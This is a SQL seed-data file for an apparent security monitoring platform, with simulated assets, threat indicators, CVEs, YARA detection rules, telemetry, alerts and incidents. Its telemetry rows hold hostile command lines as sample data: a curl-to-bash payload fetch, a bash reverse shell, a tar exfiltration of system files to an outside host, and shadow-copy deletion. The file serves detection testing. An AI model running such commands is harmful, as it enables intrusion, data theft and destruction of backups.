-- Sentinel Shield — Seed Data
-- Safe to re-run: all inserts use ON CONFLICT DO NOTHING

-- ── Assets ────────────────────────────────────────────────────────────────────
INSERT INTO assets (id, hostname, ip_address, os_platform, os_version, department, owner, criticality, risk_score, is_active, last_seen, tags)
VALUES
  ('a1000000-0000-0000-0000-000000000001', 'web-prod-01',    '10.0.1.10',      'linux',   'Ubuntu 22.04',   'Engineering',  'ops-team',   'critical', 72, true,  now() - interval '5 minutes',  ARRAY['web','production','internet-facing']),
  ('a1000000-0000-0000-0000-000000000002', 'db-primary',     '10.0.2.20',      'linux',   'Ubuntu 22.04',   'Engineering',  'dba-team',   'critical', 88, true,  now() - interval '2 minutes',  ARRAY['database','production','pii']),
  ('a1000000-0000-0000-0000-000000000003', 'fw-core-01',     '10.0.0.1',       'linux',   'FortiOS 7.4',    'NetOps',       'net-team',   'critical', 35, true,  now() - interval '1 minute',   ARRAY['firewall','network','perimeter']),
  ('a1000000-0000-0000-0000-000000000004', 'app-server-02',  '10.0.1.22',      'linux',   'RHEL 9.2',       'Engineering',  'ops-team',   'high',     61, true,  now() - interval '10 minutes', ARRAY['application','production']),
  ('a1000000-0000-0000-0000-000000000005', 'dev-laptop-42',  '192.168.10.42',  'darwin',  'macOS 14.4',     'Engineering',  'jsmith',     'medium',   45, true,  now() - interval '30 minutes', ARRAY['endpoint','development','vpn']),
  ('a1000000-0000-0000-0000-000000000006', 'win-workstation-07', '192.168.10.107', 'windows', 'Windows 11 23H2', 'Finance',  'mwilliams', 'high',    78, true,  now() - interval '15 minutes', ARRAY['endpoint','finance','pii']),
  ('a1000000-0000-0000-0000-000000000007', 'backup-srv-01',  '10.0.3.50',      'linux',   'Ubuntu 20.04',   'Operations',   'ops-team',   'high',     52, true,  now() - interval '1 hour',     ARRAY['backup','storage']),
  ('a1000000-0000-0000-0000-000000000008', 'old-print-srv',  '192.168.20.5',   'windows', 'Windows Server 2016', 'IT',   'helpdesk',   'low',      91, false, now() - interval '7 days',     ARRAY['print','legacy','eol'])
ON CONFLICT (ip_address) DO NOTHING;

-- ── IOCs ──────────────────────────────────────────────────────────────────────
INSERT INTO iocs (id, ioc_type, value, threat_type, malware_family, confidence, severity, first_seen, last_seen, tags, raw_data)
VALUES
  ('b1000000-0000-0000-0000-000000000001', 'ip',         '185.220.101.47',                         'c2',          'Cobalt Strike',   90, 'critical', now() - interval '3 days',  now() - interval '2 hours',  ARRAY['c2','cobalt-strike'],           '{"source":"abuse_threatfox","actor":"APT41"}'),
  ('b1000000-0000-0000-0000-000000000002', 'ip',         '91.108.4.200',                           'scan',        NULL,              60, 'medium',   now() - interval '10 days', now() - interval '1 day',    ARRAY['scanner','shodan'],             '{"source":"abuse_bazaar"}'),
  ('b1000000-0000-0000-0000-000000000003', 'domain',     'update-service.ru',                      'phishing',    'QakBot',          85, 'high',     now() - interval '5 days',  now() - interval '6 hours',  ARRAY['phishing','qakbot'],            '{"source":"openphish","actor":"TA551"}'),
  ('b1000000-0000-0000-0000-000000000004', 'domain',     'cdn-microsoft-update.com',               'c2',          'IcedID',          88, 'high',     now() - interval '2 days',  now() - interval '3 hours',  ARRAY['c2','iceid','lookalike'],       '{"source":"abuse_threatfox","actor":"TA577"}'),
  ('b1000000-0000-0000-0000-000000000005', 'hash_sha256','3395856ce81f2b7382dee72602f798b642f14d45e9c43e48b916296e91b0b3f1',  'malware',     'Mimikatz',        95, 'critical', now() - interval '1 day',   now() - interval '30 minutes', ARRAY['malware','credential-dumping'], '{"source":"abuse_bazaar","actor":"APT29"}'),
  ('b1000000-0000-0000-0000-000000000006', 'hash_md5',   'd41d8cd98f00b204e9800998ecf8427e',       'ransomware',  'LockBit',         70, 'critical', now() - interval '4 days',  now() - interval '4 hours',  ARRAY['ransomware','lockbit'],         '{"source":"abuse_bazaar"}'),
  ('b1000000-0000-0000-0000-000000000007', 'url',        'http://185.220.101.47/stage2.ps1',       'malware',     'PowerShell Dropper', 92, 'critical', now() - interval '1 day', now() - interval '1 hour',  ARRAY['dropper','powershell'],         '{"source":"urlhaus","actor":"APT41"}'),
  ('b1000000-0000-0000-0000-000000000008', 'ip',         '45.33.32.156',                           'scan',        NULL,              55, 'low',      now() - interval '15 days', now() - interval '2 days',   ARRAY['scanner'],                      '{"source":"abuse_threatfox"}'),
  ('b1000000-0000-0000-0000-000000000009', 'domain',     'exfil-drop.onion.ws',                    'exfil',       'BlackCat',        80, 'high',     now() - interval '6 days',  now() - interval '12 hours', ARRAY['exfil','blackcat','ransomware'],'{"source":"abuse_threatfox","actor":"BlackCat"}'),
  ('b1000000-0000-0000-0000-000000000010', 'hash_sha1',  'da39a3ee5e6b4b0d3255bfef95601890afd80709',  'malware',  'WebShell',        75, 'high',     now() - interval '8 days',  now() - interval '1 day',    ARRAY['webshell'],                     '{"source":"custom"}'),
  ('b1000000-0000-0000-0000-000000000011', 'ip',         '193.32.162.100',                         'c2',          'Emotet',          88, 'high',     now() - interval '2 days',  now() - interval '5 hours',  ARRAY['c2','emotet'],                  '{"source":"abuse_threatfox","actor":"Mummy Spider"}'),
  ('b1000000-0000-0000-0000-000000000012', 'email',      'phish@malicious-domain.xyz',             'phishing',    NULL,              65, 'medium',   now() - interval '3 days',  now() - interval '8 hours',  ARRAY['phishing','email'],             '{"source":"custom"}'),
  ('b1000000-0000-0000-0000-000000000013', 'domain',     'malware-c2-server.xyz',                  'c2',          'AsyncRAT',        82, 'high',     now() - interval '7 days',  now() - interval '2 days',   ARRAY['c2','asyncrat'],                '{"source":"abuse_threatfox","actor":"TA456"}'),
  ('b1000000-0000-0000-0000-000000000014', 'url',        'https://pastebin.com/raw/aB3xZ7kQ',      'malware',     'Stager',          50, 'medium',   now() - interval '1 day',   now() - interval '6 hours',  ARRAY['stager','pastebin'],            '{"source":"custom"}'),
  ('b1000000-0000-0000-0000-000000000015', 'cidr',       '10.10.99.0/24',                          'scan',        NULL,              40, 'low',      now() - interval '20 days', now() - interval '5 days',   ARRAY['internal-scan'],                '{"source":"custom","note":"internal recon subnet"}')
ON CONFLICT (ioc_type, value) DO NOTHING;

-- ── CVEs ──────────────────────────────────────────────────────────────────────
INSERT INTO cves (id, cve_id, published_at, modified_at, cvss_v3_score, cvss_v3_vector, severity, description, affected_products, has_exploit, kev_listed)
VALUES
  ('c1000000-0000-0000-0000-000000000001', 'CVE-2024-1234', '2024-01-15 00:00:00+00', now(), 9.8, 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'critical', 'Remote code execution in OpenSSL via buffer overflow in TLS handshake processing.', '[{"vendor":"OpenSSL","product":"OpenSSL","versions":"<3.2.1"}]', true,  true),
  ('c1000000-0000-0000-0000-000000000002', 'CVE-2024-2356', '2024-02-20 00:00:00+00', now(), 8.8, 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H', 'high',     'Privilege escalation in Linux kernel via use-after-free in netfilter subsystem.', '[{"vendor":"Linux","product":"kernel","versions":"<6.7.3"}]', true,  false),
  ('c1000000-0000-0000-0000-000000000003', 'CVE-2024-3789', '2024-03-10 00:00:00+00', now(), 7.5, 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', 'high',     'Information disclosure in Apache HTTP Server via path traversal in mod_rewrite.', '[{"vendor":"Apache","product":"HTTP Server","versions":"<2.4.59"}]', false, false),
  ('c1000000-0000-0000-0000-000000000004', 'CVE-2024-4001', '2024-04-05 00:00:00+00', now(), 9.0, 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H', 'critical', 'SQL injection in WordPress plugin allowing unauthenticated database access.', '[{"vendor":"WordPress","product":"WP Statistics Plugin","versions":"<14.5"}]', true,  true),
  ('c1000000-0000-0000-0000-000000000005', 'CVE-2024-5512', '2024-05-12 00:00:00+00', now(), 6.5, 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N', 'medium',   'Sensitive data exposure in Nginx when misconfigured with open directory listing.', '[{"vendor":"Nginx","product":"nginx","versions":"<1.26.0"}]', false, false),
  ('c1000000-0000-0000-0000-000000000006', 'CVE-2024-6623', '2024-06-18 00:00:00+00', now(), 10.0,'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', 'critical', 'Remote code execution in Fortinet FortiOS SSL-VPN via heap-based buffer overflow.', '[{"vendor":"Fortinet","product":"FortiOS","versions":"<7.4.4"}]', true,  true),
  ('c1000000-0000-0000-0000-000000000007', 'CVE-2024-7891', '2024-07-22 00:00:00+00', now(), 5.4, 'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N', 'medium',   'Cross-site scripting in Grafana dashboard allowing stored XSS via alert annotations.', '[{"vendor":"Grafana","product":"Grafana","versions":"<10.4.3"}]', false, false),
  ('c1000000-0000-0000-0000-000000000008', 'CVE-2024-8102', '2024-08-01 00:00:00+00', now(), 8.1, 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H', 'high',     'Authentication bypass in Cisco IOS XE web UI allowing full device takeover.', '[{"vendor":"Cisco","product":"IOS XE","versions":"<17.9.4a"}]', true,  true),
  ('c1000000-0000-0000-0000-000000000009', 'CVE-2024-9345', '2024-09-09 00:00:00+00', now(), 7.8, 'CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H', 'high',     'Local privilege escalation in Windows Print Spooler service via DLL injection.', '[{"vendor":"Microsoft","product":"Windows","versions":"all supported"}]', true,  false),
  ('c1000000-0000-0000-0000-000000000010', 'CVE-2024-0987', '2024-01-03 00:00:00+00', now(), 5.0, 'CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N', 'medium',   'SSRF vulnerability in curl allowing access to internal network endpoints.', '[{"vendor":"curl","product":"curl","versions":"<8.5.0"}]', false, false)
ON CONFLICT (cve_id) DO NOTHING;

-- ── MITRE ATT&CK Techniques ───────────────────────────────────────────────────
INSERT INTO attack_techniques (technique_id, name, tactic, description, platforms, is_subtechnique, parent_id)
VALUES
  ('T1059', 'Command and Scripting Interpreter', 'execution',        'Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries.', ARRAY['Windows','macOS','Linux'], false, NULL),
  ('T1078', 'Valid Accounts',                    'defense-evasion', 'Adversaries may obtain and abuse credentials of existing accounts to gain initial access.', ARRAY['Windows','macOS','Linux','Cloud'], false, NULL),
  ('T1003', 'OS Credential Dumping',             'credential-access','Adversaries may attempt to dump credentials to obtain account login and credential material.', ARRAY['Windows','Linux','macOS'], false, NULL),
  ('T1566', 'Phishing',                          'initial-access',   'Adversaries may send phishing messages to gain access to victim systems.', ARRAY['Windows','macOS','Linux','SaaS','Office 365'], false, NULL),
  ('T1486', 'Data Encrypted for Impact',         'impact',           'Adversaries may encrypt data on target systems to interrupt availability to system and network resources.', ARRAY['Windows','macOS','Linux'], false, NULL),
  ('T1190', 'Exploit Public-Facing Application', 'initial-access',   'Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program.', ARRAY['Windows','macOS','Linux','Network'], false, NULL),
  ('T1021', 'Remote Services',                   'lateral-movement', 'Adversaries may use valid accounts to log into a service specifically designed to accept remote connections.', ARRAY['Windows','macOS','Linux'], false, NULL),
  ('T1083', 'File and Directory Discovery',      'discovery',        'Adversaries may enumerate files and directories or may search in specific locations for key information.', ARRAY['Windows','macOS','Linux'], false, NULL)
ON CONFLICT (technique_id) DO NOTHING;

-- ── YARA Rules ────────────────────────────────────────────────────────────────
INSERT INTO yara_rules (id, rule_name, rule_content, threat_family, severity, source, enabled)
VALUES
  ('e1000000-0000-0000-0000-000000000001',
   'DetectMimikatz',
   'rule DetectMimikatz { meta: description = "Detects Mimikatz credential dumper" author = "sentinel-shield" strings: $s1 = "sekurlsa::logonpasswords" nocase $s2 = "mimikatz" nocase $s3 = "lsadump::sam" nocase condition: any of them }',
   'Mimikatz', 'critical', 'custom', true),
  ('e1000000-0000-0000-0000-000000000002',
   'SuspiciousPowerShell',
   'rule SuspiciousPowerShell { meta: description = "Detects obfuscated or suspicious PowerShell execution" strings: $e1 = "-EncodedCommand" nocase $e2 = "IEX" nocase $e3 = "Invoke-Expression" nocase $e4 = "DownloadString" nocase condition: 2 of them }',
   'PowerShell Dropper', 'high', 'custom', true),
  ('e1000000-0000-0000-0000-000000000003',
   'RansomwareFileOp',
   'rule RansomwareFileOp { meta: description = "Detects mass file rename/encryption patterns common to ransomware" strings: $ext1 = ".locked" nocase $ext2 = ".encrypted" nocase $ext3 = ".crypted" nocase $note1 = "READ_ME" nocase $note2 = "HOW_TO_DECRYPT" nocase condition: any of ($ext*) or any of ($note*) }',
   'Ransomware', 'critical', 'custom', true),
  ('e1000000-0000-0000-0000-000000000004',
   'WebShellGeneric',
   'rule WebShellGeneric { meta: description = "Detects generic PHP/ASP web shell patterns" strings: $php1 = "eval(base64_decode(" $php2 = "system($_" $php3 = "passthru($_" $asp1 = "<%=CreateObject(" condition: any of them }',
   'WebShell', 'high', 'custom', true),
  ('e1000000-0000-0000-0000-000000000005',
   'CobaltStrikeBeacon',
   'rule CobaltStrikeBeacon { meta: description = "Detects Cobalt Strike beacon shellcode patterns" strings: $cs1 = { 4D 5A 90 00 03 00 00 00 } $cs2 = "ReflectiveLoader" $cs3 = "%s as %s\\%s" condition: ($cs1 at 0) or $cs2 or $cs3 }',
   'Cobalt Strike', 'critical', 'custom', true)
ON CONFLICT (rule_name) DO NOTHING;

-- ── Telemetry Events ──────────────────────────────────────────────────────────
INSERT INTO telemetry_events (id, asset_id, event_time, event_type, process_name, process_pid, process_cmdline, src_ip, dst_ip, dst_port, protocol, file_path, user_account)
VALUES
  ('f1000000-0000-0000-0000-000000000001', 'a1000000-0000-0000-0000-000000000002', now() - interval '47 hours', 'process_start',   'powershell.exe',  4412, 'powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA', NULL,            NULL,            NULL, NULL,  NULL,                          'SYSTEM'),
  ('f1000000-0000-0000-0000-000000000002', 'a1000000-0000-0000-0000-000000000002', now() - interval '46 hours', 'network_connect',  'powershell.exe',  4412, NULL,                                                          '10.0.2.20',     '185.220.101.47', 443, 'tcp',  NULL,                          'SYSTEM'),
  ('f1000000-0000-0000-0000-000000000003', 'a1000000-0000-0000-0000-000000000006', now() - interval '44 hours', 'process_start',   'cmd.exe',         2201, 'cmd.exe /c whoami && net user',                               NULL,            NULL,            NULL, NULL,  NULL,                          'mwilliams'),
  ('f1000000-0000-0000-0000-000000000004', 'a1000000-0000-0000-0000-000000000001', now() - interval '42 hours', 'network_connect',  'nginx',           1001, NULL,                                                          '10.0.1.10',     '91.108.4.200',   80, 'tcp',  NULL,                          'www-data'),
  ('f1000000-0000-0000-0000-000000000005', 'a1000000-0000-0000-0000-000000000002', now() - interval '40 hours', 'file_create',     'lsass.exe',       880,  NULL,                                                          NULL,            NULL,            NULL, NULL,  'C:\\Windows\\Temp\\kiwi.dmp',  'SYSTEM'),
  ('f1000000-0000-0000-0000-000000000006', 'a1000000-0000-0000-0000-000000000005', now() - interval '36 hours', 'login',           'sshd',            1122, NULL,                                                          '192.168.10.42', '10.0.2.20',     22, 'tcp',  NULL,                          'jsmith'),
  ('f1000000-0000-0000-0000-000000000007', 'a1000000-0000-0000-0000-000000000004', now() - interval '30 hours', 'process_start',   'python3',         7788, 'python3 /tmp/.x/beacon.py',                                   NULL,            NULL,            NULL, NULL,  NULL,                          'www-data'),
  ('f1000000-0000-0000-0000-000000000008', 'a1000000-0000-0000-0000-000000000004', now() - interval '29 hours', 'network_connect',  'python3',         7788, NULL,                                                          '10.0.1.22',     '185.220.101.47', 443, 'tcp',  NULL,                          'www-data'),
  ('f1000000-0000-0000-0000-000000000009', 'a1000000-0000-0000-0000-000000000007', now() - interval '24 hours', 'file_modify',     'vssadmin.exe',    3344, 'vssadmin delete shadows /all /quiet',                         NULL,            NULL,            NULL, NULL,  'C:\\Windows\\System32\\',     'SYSTEM'),
  ('f1000000-0000-0000-0000-000000000010', 'a1000000-0000-0000-0000-000000000002', now() - interval '22 hours', 'file_create',     'conhost.exe',     5500, NULL,                                                          NULL,            NULL,            NULL, NULL,  'D:\\backup\\ransom_note.txt',  'SYSTEM'),
  ('f1000000-0000-0000-0000-000000000011', 'a1000000-0000-0000-0000-000000000003', now() - interval '20 hours', 'login_fail',      'sshd',            2233, NULL,                                                          '91.108.4.200',  '10.0.0.1',      22, 'tcp',  NULL,                          'admin'),
  ('f1000000-0000-0000-0000-000000000012', 'a1000000-0000-0000-0000-000000000003', now() - interval '19 hours', 'login_fail',      'sshd',            2233, NULL,                                                          '91.108.4.200',  '10.0.0.1',      22, 'tcp',  NULL,                          'root'),
  ('f1000000-0000-0000-0000-000000000013', 'a1000000-0000-0000-0000-000000000003', now() - interval '18 hours', 'login',           'sshd',            2234, NULL,                                                          '91.108.4.200',  '10.0.0.1',      22, 'tcp',  NULL,                          'admin'),
  ('f1000000-0000-0000-0000-000000000014', 'a1000000-0000-0000-0000-000000000006', now() - interval '15 hours', 'process_start',   'wscript.exe',     6601, 'wscript.exe //B invoice.vbs',                                 NULL,            NULL,            NULL, NULL,  NULL,                          'mwilliams'),
  ('f1000000-0000-0000-0000-000000000015', 'a1000000-0000-0000-0000-000000000006', now() - interval '14 hours', 'network_connect',  'rundll32.exe',   6602, NULL,                                                          '192.168.10.107','193.32.162.100', 443, 'tcp',  NULL,                          'mwilliams'),
  ('f1000000-0000-0000-0000-000000000016', 'a1000000-0000-0000-0000-000000000001', now() - interval '10 hours', 'file_create',     'nginx',           1001, NULL,                                                          NULL,            NULL,            NULL, NULL,  '/var/www/html/.cache/.sh',    'www-data'),
  ('f1000000-0000-0000-0000-000000000017', 'a1000000-0000-0000-0000-000000000005', now() - interval '8 hours',  'process_start',   'osascript',       9900, 'osascript -e ''do shell script "curl -s http://185.220.101.47/payload | bash"''', NULL, NULL, NULL, NULL, NULL,                          'jsmith'),
  ('f1000000-0000-0000-0000-000000000018', 'a1000000-0000-0000-0000-000000000002', now() - interval '6 hours',  'network_connect',  'mysqld',         1111, NULL,                                                          '10.0.2.20',     '45.33.32.156',  3306, 'tcp',  NULL,                          'mysql'),
  ('f1000000-0000-0000-0000-000000000019', 'a1000000-0000-0000-0000-000000000004', now() - interval '3 hours',  'file_modify',     'bash',            8812, 'bash -i >& /dev/tcp/185.220.101.47/4444 0>&1',                NULL,            NULL,            NULL, NULL,  NULL,                          'www-data'),
  ('f1000000-0000-0000-0000-000000000020', 'a1000000-0000-0000-0000-000000000007', now() - interval '1 hour',   'process_start',   'tar',             4411, 'tar czf /dev/tcp/exfil-drop.onion.ws/8080 /etc /var/lib/postgresql', NULL,      NULL,            NULL, NULL,  NULL,                          'backup')
ON CONFLICT DO NOTHING;

-- ── Security Alerts ───────────────────────────────────────────────────────────
INSERT INTO security_alerts (id, title, description, alert_type, severity, status, asset_id, ioc_id, cve_id, mitre_technique, occurred_at, ai_summary)
VALUES
  ('d1000000-0000-0000-0000-000000000001',
   'Cobalt Strike C2 beacon detected on db-primary',
   'Outbound connection to known Cobalt Strike C2 server 185.220.101.47 from db-primary.',
   'c2_beacon', 'critical', 'open',
   'a1000000-0000-0000-0000-000000000002', 'b1000000-0000-0000-0000-000000000001', NULL, 'T1059',
   now() - interval '46 hours',
   'High-confidence C2 beacon pattern. PowerShell encoded command followed by outbound TCP/443 to threat-actor-associated IP. Recommend immediate isolation.'),

  ('d1000000-0000-0000-0000-000000000002',
   'Mimikatz credential dumping on db-primary',
   'LSASS memory dump artifact detected. File kiwi.dmp created in Temp directory.',
   'malware_detected', 'critical', 'open',
   'a1000000-0000-0000-0000-000000000002', 'b1000000-0000-0000-0000-000000000005', NULL, 'T1003',
   now() - interval '40 hours',
   'Credential dumping tool executed under SYSTEM context. LSASS dump file created. Attacker likely harvesting credentials for lateral movement.'),

  ('d1000000-0000-0000-0000-000000000003',
   'Volume shadow copies deleted on backup-srv-01',
   'vssadmin delete shadows /all /quiet executed — ransomware pre-encryption indicator.',
   'ransomware_behavior', 'critical', 'open',
   'a1000000-0000-0000-0000-000000000007', NULL, NULL, 'T1486',
   now() - interval '24 hours',
   'Shadow copy deletion is a pre-cursor to ransomware encryption. Ransom note artifact found on db-primary. High probability of active ransomware deployment.'),

  ('d1000000-0000-0000-0000-000000000004',
   'Brute-force SSH login against fw-core-01',
   'Multiple failed SSH login attempts from 91.108.4.200 followed by successful auth.',
   'brute_force', 'high', 'open',
   'a1000000-0000-0000-0000-000000000003', 'b1000000-0000-0000-0000-000000000002', NULL, 'T1078',
   now() - interval '19 hours',
   'Sequential login failures from scanner IP then successful authentication. Possible credential stuffing or password spray. Firewall admin account may be compromised.'),

  ('d1000000-0000-0000-0000-000000000005',
   'Phishing document executed on win-workstation-07',
   'wscript.exe launched invoice.vbs followed by network connection to C2.',
   'phishing_url', 'high', 'open',
   'a1000000-0000-0000-0000-000000000006', 'b1000000-0000-0000-0000-000000000011', NULL, 'T1566',
   now() - interval '14 hours',
   'Macro-enabled document triggered VBScript execution. Subsequent rundll32 C2 callback to Emotet-associated IP. Finance user endpoint likely compromised.'),

  ('d1000000-0000-0000-0000-000000000006',
   'Suspicious Python beacon on app-server-02',
   'Unknown Python process spawned from /tmp/.x/ and connecting to C2 IP.',
   'c2_beacon', 'high', 'investigating',
   'a1000000-0000-0000-0000-000000000004', 'b1000000-0000-0000-0000-000000000001', NULL, 'T1059',
   now() - interval '29 hours',
   'Hidden directory in /tmp contains beacon script. Matches Cobalt Strike staging pattern. Under investigation.'),

  ('d1000000-0000-0000-0000-000000000007',
   'Potential data exfiltration from backup-srv-01',
   'tar command piped to external host over TCP — likely data staging/exfil.',
   'data_exfil', 'high', 'open',
   'a1000000-0000-0000-0000-000000000007', 'b1000000-0000-0000-0000-000000000009', NULL, 'T1486',
   now() - interval '1 hour',
   'Backup server executing tar to exfil endpoint associated with BlackCat ransomware. Data exfiltration in progress or recently completed.'),

  ('d1000000-0000-0000-0000-000000000008',
   'MySQL outbound connection to scanner IP from db-primary',
   'Database process connecting out on port 3306 to known scanner/attacker IP.',
   'anomaly', 'medium', 'open',
   'a1000000-0000-0000-0000-000000000002', 'b1000000-0000-0000-0000-000000000008', NULL, 'T1021',
   now() - interval '6 hours',
   'Unusual outbound database connection. Could indicate DB backdoor, rogue replication setup, or data theft channel.'),

  ('d1000000-0000-0000-0000-000000000009',
   'Web shell deployed on web-prod-01',
   'Hidden shell script created in web root by nginx process.',
   'yara_rule_match', 'high', 'resolved',
   'a1000000-0000-0000-0000-000000000001', 'b1000000-0000-0000-0000-000000000010', NULL, 'T1190',
   now() - interval '10 hours',
   'Web shell artifact matched YARA rule WebShellGeneric. File removed and server hardened. CVE-2024-3789 exploitation suspected.'),

  ('d1000000-0000-0000-0000-000000000010',
   'CVE-2024-6623 exploitation attempt on fw-core-01',
   'FortiOS SSL-VPN exploit payload detected in HTTP request headers.',
   'cve_exploitation', 'critical', 'resolved',
   'a1000000-0000-0000-0000-000000000003', NULL, 'c1000000-0000-0000-0000-000000000006', 'T1190',
   now() - interval '5 days',
   'Exploit pattern matches known FortiOS RCE. Blocked by WAF. Patch applied. Resolved.'),

  ('d1000000-0000-0000-0000-000000000011',
   'Lateral movement via RDP from dev-laptop-42',
   'Unexpected RDP connection from developer laptop to db-primary.',
   'lateral_movement', 'medium', 'resolved',
   'a1000000-0000-0000-0000-000000000005', NULL, NULL, 'T1021',
   now() - interval '3 days',
   'Developer machine initiating RDP to production DB. User confirmed this was unauthorized. Session terminated.'),

  ('d1000000-0000-0000-0000-000000000012',
   'Port scan detected from external IP against web-prod-01',
   'Sequential port probe across all TCP ports from 91.108.4.200.',
   'port_scan', 'low', 'resolved',
   'a1000000-0000-0000-0000-000000000001', 'b1000000-0000-0000-0000-000000000002', NULL, 'T1083',
   now() - interval '6 days',
   'Standard external port scan. No exploit follow-up observed. Logged and monitored.')
ON CONFLICT DO NOTHING;

-- ── Incidents ─────────────────────────────────────────────────────────────────
INSERT INTO incidents (id, title, summary, severity, status, assigned_to, ai_analysis)
VALUES
  ('11000000-0000-0000-0000-000000000001',
   'Suspected Ransomware Activity on db-primary',
   'Multiple high-severity alerts correlated: C2 beacon, credential dumping, shadow copy deletion, and ransom note artifact on db-primary and backup server.',
   'critical', 'investigating', 'alice@example.com',
   'Chain of events suggests a Cobalt Strike-facilitated attack: initial access via web shell on web-prod-01, lateral movement to db-primary, credential dumping via Mimikatz, and pre-encryption activity including shadow copy deletion. BlackCat/ALPHV ransomware group TTPs match observed behavior. Immediate containment recommended: isolate db-primary and backup-srv-01, rotate all credentials, engage IR team.'),

  ('11000000-0000-0000-0000-000000000002',
   'Finance Workstation Compromised via Phishing',
   'win-workstation-07 user mwilliams executed phishing document, triggering Emotet loader with C2 callback.',
   'high', 'open', 'bob@example.com',
   'Phishing email with malicious VBScript attachment executed on finance endpoint. Emotet beacon established to 193.32.162.100. Risk of banking trojan deployment or credential theft. Endpoint should be reimaged. Phishing simulation and awareness training recommended.'),

  ('11000000-0000-0000-0000-000000000003',
   'Firewall Admin Account Brute-Forced',
   'fw-core-01 SSH brute-force from external IP succeeded. Attacker achieved admin access to perimeter firewall.',
   'high', 'open', 'alice@example.com',
   'Credential stuffing attack succeeded against firewall admin account. Attacker has perimeter control. All firewall rules should be audited immediately. MFA must be enforced on all network device management interfaces.')
ON CONFLICT DO NOTHING;

-- Link alerts to incidents
INSERT INTO incident_alerts (incident_id, alert_id)
VALUES
  ('11000000-0000-0000-0000-000000000001', 'd1000000-0000-0000-0000-000000000001'),
  ('11000000-0000-0000-0000-000000000001', 'd1000000-0000-0000-0000-000000000002'),
  ('11000000-0000-0000-0000-000000000001', 'd1000000-0000-0000-0000-000000000003'),
  ('11000000-0000-0000-0000-000000000001', 'd1000000-0000-0000-0000-000000000007'),
  ('11000000-0000-0000-0000-000000000002', 'd1000000-0000-0000-0000-000000000005'),
  ('11000000-0000-0000-0000-000000000003', 'd1000000-0000-0000-0000-000000000004')
ON CONFLICT DO NOTHING;

-- ── Playbook Runs ─────────────────────────────────────────────────────────────
INSERT INTO playbook_runs (id, playbook_id, alert_id, status, actions_taken, started_at, completed_at)
VALUES
  ('21000000-0000-0000-0000-000000000001',
   'ransomware-response-v2',
   'd1000000-0000-0000-0000-000000000003',
   'completed',
   '[{"step":"isolate_host","status":"done","host":"backup-srv-01"},{"step":"snapshot_memory","status":"done"},{"step":"notify_soc","status":"done","channel":"#incidents"},{"step":"block_ioc","status":"done","ioc":"185.220.101.47"},{"step":"create_incident","status":"done","incident_id":"11000000-0000-0000-0000-000000000001"}]',
   now() - interval '23 hours 50 minutes',
   now() - interval '23 hours 30 minutes'),

  ('21000000-0000-0000-0000-000000000002',
   'phishing-response-v1',
   'd1000000-0000-0000-0000-000000000005',
   'running',
   '[{"step":"quarantine_email","status":"done"},{"step":"block_sender_domain","status":"done","domain":"malicious-domain.xyz"},{"step":"scan_mailbox","status":"running"}]',
   now() - interval '13 hours',
   NULL)
ON CONFLICT DO NOTHING;
